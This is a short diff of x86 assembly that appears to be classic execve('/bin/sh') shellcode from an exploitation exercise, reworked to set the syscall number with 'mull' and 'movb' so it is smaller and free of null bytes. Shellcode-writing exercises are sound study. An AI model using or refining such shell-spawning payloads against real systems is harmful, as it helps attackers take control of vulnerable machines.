@@ -14,14 +14,14 @@ _start:
     jmp just_before_str
 
 execve_sh:
-    # __NR_execve 11
-    pushl $11
-    popl %eax
-
     popl %ebx
 
     xorl %ecx, %ecx
-    # xorl %edx, %edx
+
+    mull %ecx
+
+    # __NR_execve 11
+    movb $11, %al
 
     int $0x80
 
